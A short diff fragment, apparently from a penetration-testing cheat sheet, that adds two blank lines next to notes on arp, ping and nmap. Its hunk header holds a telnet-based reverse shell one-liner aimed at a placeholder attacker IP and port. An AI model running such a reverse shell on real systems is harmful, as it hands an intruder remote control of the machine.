@@ -101,3 +101,5 @@ TF=$(mktemp -u); mkfifo $TF && telnet <attacker IP> <attacker port> 0<$TF | /bin
     arp -a: Display ARP table.
     ping <target IP>: Test network connectivity to a target.
     nmap: Scan a network for open ports and services.
+
+
